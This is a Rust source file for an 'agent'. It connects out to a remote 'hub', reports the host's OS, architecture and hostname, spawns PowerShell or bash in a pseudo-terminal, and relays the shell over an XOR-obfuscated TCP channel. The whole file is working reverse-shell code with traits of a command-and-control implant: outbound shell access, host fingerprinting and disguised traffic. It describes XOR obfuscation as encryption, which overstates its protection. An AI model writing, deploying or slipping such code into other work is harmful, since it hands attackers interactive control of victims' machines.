//! PTY agent runtime helpers.
//!
//! Connects to the hub, performs the initial handshake, spawns a local
//! pseudo-terminal (PowerShell on Windows, bash on Unix), and bridges I/O
//! between the PTY and the hub over an XOR-encrypted TCP channel.
//!
use berlinproto::handshake::AgentInfo;
use berlinproto::xor::XorCipher;
use portable_pty::{CommandBuilder, PtySize, native_pty_system};
use std::env;
use std::error::Error;
use std::io::{Read, Write};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc;

/// Connect to hub server and establish PTY shell session with encryption
///
/// # Arguments
/// * `servidor_addr` - Hub server address (e.g., "127.0.0.1:80")
pub async fn run(servidor_addr: String) -> Result<(), Box<dyn std::error::Error>> {
    let mut stream = TcpStream::connect(servidor_addr).await?;
    send_handshake(&mut stream).await?;

    let (mut tcp_read, mut tcp_write) = stream.into_split();
    println!("✅ Agent connected to Hub.");

    // Initialize pseudo-terminal with standard shell size
    let pty_system = native_pty_system();
    let pair = pty_system.openpty(PtySize {
        rows: 35,
        cols: 132,
        ..Default::default()
    })?;
    println!("✅ Native pty system.");
    // Spawn appropriate shell based on OS (PowerShell on Windows, Bash on Unix)
    let cmd = if cfg!(windows) {
        let mut c = CommandBuilder::new("powershell.exe");
        c.args([
            "-NoExit",
            "-NoLogo",
            "-Command",
            "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8",
        ]);
        c
    } else {
        let mut c = CommandBuilder::new("bash");
        c.env("TERM", "xterm-256color");
        c.env("LANG", "es_ES.UTF-8");
        c
    };
    let mut child = pair.slave.spawn_command(cmd)?;
    println!("✅ PTY process spawned.");
    drop(pair.slave);

    // Create channel for PTY output and initialize XOR ciphers for encryption
    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();
    let mut encryptor = XorCipher::new(); // Encryptor: PTY -> TCP
    let mut decryptor = XorCipher::new(); // Decryptor: TCP -> PTY
    let mut pty_reader = pair.master.try_clone_reader()?;

    // Spawn thread to read PTY output and send to channel
    std::thread::spawn(move || {
        let mut buf = [0u8; 4096];
        while let Ok(n) = pty_reader.read(&mut buf) {
            if n == 0 {
                break;
            }
            let data = buf[..n].to_vec();

            // Send PTY output to channel for encryption and transmission
            if tx.send(data).is_err() {
                break;
            }
        }
        println!("Read thread PTY finalized.");
    });

    // Task to encrypt PTY output and send to TCP
    let tcp_writer_task = tokio::spawn(async move {
        while let Some(mut data) = rx.recv().await {
            encryptor.apply(&mut data);
            if tcp_write.write_all(&data).await.is_err() {
                break;
            }
        }
    });

    // Task to receive encrypted data from TCP and write to PTY
    let mut pty_writer = pair.master.take_writer()?;
    let tcp_reader_task = tokio::spawn(async move {
        let mut buf = [0u8; 4096];
        loop {
            match tcp_read.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => {
                    let mut data = buf[..n].to_vec();

                    // Decrypt received data and write to PTY
                    decryptor.apply(&mut data);

                    if pty_writer.write_all(&data).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Wait for either task to complete, indicating connection or process failure
    tokio::select! {
        _ = tcp_writer_task => println!("Out: Error writing to server."),
        _ = tcp_reader_task => println!("Out: Net conecc."),
    }
    // 3. NETEJA CRÍTICA: Matem el procés fill (PowerShell/Bash)
    println!("🛑 Closing PTY process...");
    
    let _= child.kill();
    // Opcional: A Windows, ConPTY a vegades necessita un segon per alliberar el terminal
    #[cfg(windows)]
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    Ok(())

}
async fn send_handshake(stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
    let info = AgentInfo {
        os: env::consts::OS.to_string(), // Retorna "windows", "linux", "macos", etc.
        arch: env::consts::ARCH.to_string(), // Retorna "x86_64", "aarch64", etc.
        hostname: hostname::get()?.to_string_lossy().into_owned(),
    };

    let mut payload = serde_json::to_vec(&info)?;
    let mut encryptor = XorCipher::new(); // Encryptor: PTY -> TCP
    encryptor.apply(&mut payload);
    stream.write_all(&payload).await?;
    drop(encryptor);
    // ESPERA UNA RESPOSTA DEL HUB (1 byte de confirmació)
    let mut ack = [0u8; 1];
    stream.read_exact(&mut ack).await?;

    //println!("📡 Hub ha confirmat el registre. Iniciant PTY...");
    Ok(())
}
